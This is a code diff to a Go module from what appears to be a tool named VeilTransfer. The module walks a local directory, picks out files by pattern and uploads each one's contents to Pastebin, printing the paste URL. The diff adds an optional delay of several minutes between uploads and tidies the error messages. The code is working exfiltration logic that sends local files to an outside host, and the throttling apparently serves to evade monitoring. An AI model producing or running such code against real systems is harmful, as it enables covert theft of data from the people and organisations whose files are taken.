@@ -10,47 +10,60 @@ import (
     "net/url"
     "os"
     "path/filepath"
-    "VeilTransfer/utils"
     "strings"
+    "time"
+
+    "client/utils"
 )
 
-const maxPastebinSize = 512 * 1024 // 512 kilobytes
+const maxPastebinSize = 512 * 1024 // 512 KB
 
-func UploadPastebin(apiDevKey, localPath string, includePatterns []string) error {
-    // Define the upload function for Pastebin
-    uploadFunc := func(filePath, remoteFilePath string) error {
+// UploadPastebin uploads files to Pastebin with optional scheduling
+func UploadPastebin(apiDevKey, localPath string, includePatterns []string, scheduleInterval int) error {
+    return utils.WalkAndUpload(localPath, "", includePatterns, func(filePath, remoteFilePath string) error {
         // Skip directories
         fileInfo, err := os.Stat(filePath)
         if err != nil {
-            return fmt.Errorf("[-] failed to get file info: %s", err)
+            return fmt.Errorf("\n[-] Failed to get file info: %s", err)
         }
         if fileInfo.IsDir() {
             fmt.Printf("[*] Skipping directory: %s\n", filePath)
             return nil
         }
 
-        return uploadFileToPastebin(apiDevKey, filePath)
-    }
+        err = uploadFileToPastebin(apiDevKey, filePath)
+        if err != nil {
+            return fmt.Errorf("\n[-] Error uploading to Pastebin: %s", err)
+        }
 
-    // Call WalkAndUpload with the upload function for Pastebin
-    return utils.WalkAndUpload(localPath, "", includePatterns, uploadFunc)
+        fmt.Printf("\n[*] File '%s' uploaded successfully to Pastebin.\n", filePath)
+
+        // If scheduling is enabled, wait before the next upload
+        if scheduleInterval > 0 {
+            fmt.Printf("[*] Waiting %d minutes before uploading next file...\n", scheduleInterval)
+            time.Sleep(time.Duration(scheduleInterval) * time.Minute)
+        }
+
+        return nil
+    }, scheduleInterval)
 }
 
+// uploadFileToPastebin handles the actual file upload to Pastebin
 func uploadFileToPastebin(apiDevKey, filePath string) error {
     // Check file size before reading
     fileInfo, err := os.Stat(filePath)
     if err != nil {
-        return fmt.Errorf("[-] failed to get file info: %s", err)
+        return fmt.Errorf("\n[-] Failed to get file info: %s", err)
     }
     if fileInfo.Size() > maxPastebinSize {
-       fmt.Errorf("[-] Error: %s (exceeds maximum size of 512 KB)", filePath)
-       return nil
+        fmt.Printf("\n[-] Error: %s (exceeds maximum size of 512 KB)\n", filePath)
+        return nil
     }
 
     // Read the content of the file
     fileContent, err := ioutil.ReadFile(filePath)
     if err != nil {
-        return fmt.Errorf("[-] failed to read file: %s", err)
+        return fmt.Errorf("\n[-] Failed to read file: %s", err)
     }
 
     // Determine the MIME type of the file
@@ -81,7 +94,7 @@ func uploadFileToPastebin(apiDevKey, filePath string) error {
     // Create a new POST request
     req, err := http.NewRequest("POST", apiURL, bytes.NewBufferString(data.Encode()))
     if err != nil {
-        return fmt.Errorf("[-] failed to create request: %s", err)
+        return fmt.Errorf("\n[-] Failed to create request: %s", err)
     }
 
     // Set the content-type header and user-agent
@@ -92,20 +105,20 @@ func uploadFileToPastebin(apiDevKey, filePath string) error {
     client := &http.Client{}
     resp, err := client.Do(req)
     if err != nil {
-        return fmt.Errorf("[-] failed to perform request: %s", err)
+        return fmt.Errorf("\n[-] Failed to perform request: %s", err)
     }
     defer resp.Body.Close()
 
     // Check if the response status is not OK
     if resp.StatusCode != http.StatusOK {
-        return fmt.Errorf("\n[-] failed to upload to Pastebin: received status code %d", resp.StatusCode)
+        return fmt.Errorf("\n[-] Failed to upload to Pastebin: received status code %d", resp.StatusCode)
     }
 
     // Read and return the response
     var result bytes.Buffer
     _, err = result.ReadFrom(resp.Body)
     if err != nil {
-        return fmt.Errorf("[-] failed to read response: %s", err)
+        return fmt.Errorf("\n[-] Failed to read response: %s", err)
     }
 
     fmt.Printf("\n[*] Successfully uploaded %s\n[*] Pastebin URL: %s\n", filePath, result.String())
